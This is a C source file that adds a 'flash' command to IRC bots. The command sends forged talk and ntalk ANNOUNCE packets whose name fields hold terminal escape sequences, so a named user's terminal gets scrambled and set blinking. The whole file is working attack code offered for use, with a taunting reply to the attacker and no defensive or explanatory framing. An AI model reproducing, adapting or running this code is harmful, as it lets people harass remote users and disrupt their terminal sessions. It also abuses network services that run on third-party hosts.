/* flash.c */

/* 
   Gnarly botflash by TheFuture!! 
   For use with Vlad/Com/Hackbots, may take a lil modding :)
   - OffSpring	 	 	   - TheFuture
     cracker@cati.CSUFresno.EDU      patjens@cati.CSUFresno.EDU
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <strings.h>

#include "send.h"
#include "config.h"
#include "channel.h"
#include "function.h"
#include "misc.h"
#include "fnmatch.h"

/* this should really be in an include file..  */

#define OLD_NAME_SIZE 9
#define NAME_SIZE    12
#define TTY_SIZE     16 
typedef struct {
	char    type;
	char    l_name[OLD_NAME_SIZE];
	char    r_name[OLD_NAME_SIZE];
	char    filler;
	u_long  id_num;
	u_long  pid;
	char    r_tty[TTY_SIZE];
	struct  sockaddr_in addr;
	struct  sockaddr_in ctl_addr;
} OLD_MSG;

typedef struct {
	u_char  vers;
	char    type;
	u_short filler;
	u_long  id_num;
	struct  sockaddr_in addr;
	struct  sockaddr_in ctl_addr;
	long    pid;
	char    l_name[NAME_SIZE];
	char    r_name[NAME_SIZE];
	char    r_tty[TTY_SIZE];
} CTL_MSG;

#define TALK_VERSION    1               /* protocol version */

/* Types */
#define LEAVE_INVITE    0
#define LOOK_UP         1
#define DELETE          2
#define ANNOUNCE        3

int     current = 1;    /* current id..  this to avoid duplications */

struct sockaddr_in *getinaddr(char *hostname, u_short port)
{
static  struct sockaddr    addr;
struct  sockaddr_in *address;
struct  hostent     *host;

address = (struct sockaddr_in *)&addr;
(void) bzero( (char *)address, sizeof(struct sockaddr_in) );
/* fill in the easy fields */
address->sin_family = AF_INET;
address->sin_port = htons(port);
/* first, check if the address is an ip address */
address->sin_addr.s_addr = inet_addr(hostname);
if ( (int)address->sin_addr.s_addr == -1)
	{
	/* it wasn't.. so we try it as a long host name */
	host = gethostbyname(hostname);
	if (host)
		{
		/* wow.  It's a host name.. set the fields */
		/* ?? address->sin_family = host->h_addrtype; */
		bcopy( host->h_addr, (char *)&address->sin_addr,
			host->h_length);
		}
	else
		{
		/* oops.. can't find it.. */
		puts("Couldn't find address"); 
		exit(-1);
		return (struct sockaddr_in *)0;
		}
	}
/* all done. */
return (struct sockaddr_in *)address;
}

SendTalkPacket(struct sockaddr_in *target, char *p, int psize) 
{
int     s;
struct sockaddr sample; /* not used.. only to get the size */

s = socket(AF_INET, SOCK_DGRAM, 0);
sendto( s, p, psize, 0,(struct sock_addr *)target, sizeof(sample) ); 
} 


new_ANNOUNCE(char *hostname, char *remote, char *local)
{
CTL_MSG  packet; 
struct   sockaddr_in  *address;

/* create a packet */
address = getinaddr(hostname, 666 );  
address->sin_family = htons(AF_INET); 

bzero( (char *)&packet, sizeof(packet) );
packet.vers   = TALK_VERSION; 
packet.type   = ANNOUNCE;   
packet.pid    = getpid();
packet.id_num = current;
bcopy( (char *)address, (char *)&packet.addr, sizeof(packet.addr ) ); 
bcopy( (char *)address, (char *)&packet.ctl_addr, sizeof(packet.ctl_addr));
strncpy( packet.l_name, local, NAME_SIZE); 
strncpy( packet.r_name, remote, NAME_SIZE); 
strncpy( packet.r_tty, "", 1); 

SendTalkPacket( getinaddr(hostname, 518), (char *)&packet, sizeof(packet) ); 
}

old_ANNOUNCE(char *hostname, char *remote, char *local)
{
OLD_MSG  packet;
struct   sockaddr_in  *address;

/* create a packet */
address = getinaddr(hostname, 666 );
address->sin_family = htons(AF_INET);

bzero( (char *)&packet, sizeof(packet) );
packet.type   = ANNOUNCE;
packet.pid    = getpid();
packet.id_num = current;
bcopy( (char *)address, (char *)&packet.addr, sizeof(packet.addr ) );
bcopy( (char *)address, (char *)&packet.ctl_addr, sizeof(packet.ctl_addr));
strncpy( packet.l_name, local, NAME_SIZE);
strncpy( packet.r_name, remote, NAME_SIZE);
strncpy( packet.r_tty, "", 1);

SendTalkPacket( getinaddr(hostname, 517), (char *)&packet, sizeof(packet) );
}

void do_flash(char *from, char *to, char *rest)
{
	char    *hostname, *userhost, *host, *user; 
	int     pid;

	if(!rest) { 
		sendreply("Usage:<user@host> ");
		return;
	}

        user = find_userhost(from, rest);
        if (!user)
          return;

	if ((hostname = (char *)strchr(user, '@')) == NULL)
	{
		sendreply("Invalid user@host ..");
		return;
	}
	*hostname = '\0'; 
	hostname++;
        host = gethostbyname(hostname);
        if (!host)
        {
            sendreply("Invalid user@host ..");
            return;
        }
        userhost = myuh(user);
	if (*userhost == '~') 
		userhost++; 

#define FIRST "\033c\033(0\033#8" 
#define SECOND "\033[1;3r\033[J"
#define THIRD  "\033[5m\033[?5h"
#define FOURTH "**B00"
	new_ANNOUNCE(hostname, userhost, FIRST);
	old_ANNOUNCE(hostname, userhost, FIRST);
	current++; 
	new_ANNOUNCE(hostname, userhost, SECOND);
	new_ANNOUNCE(hostname, userhost, SECOND);
	current++;
	new_ANNOUNCE(hostname, userhost, THIRD); 
	old_ANNOUNCE(hostname, userhost, THIRD);
	current++;
	new_ANNOUNCE(hostname, userhost, FOURTH); 
	old_ANNOUNCE(hostname, userhost, FOURTH);
	current++;
	new_ANNOUNCE(hostname, userhost, THIRD); 
	old_ANNOUNCE(hostname, userhost, THIRD);
	current++;
	new_ANNOUNCE(hostname, userhost, FOURTH);
	old_ANNOUNCE(hostname, userhost, FOURTH);
	current++;
	new_ANNOUNCE(hostname, userhost, FOURTH);
	old_ANNOUNCE(hostname, userhost, FOURTH);
	sendreply("Heh .. Flashed that monkey .. :>");
	return;
}


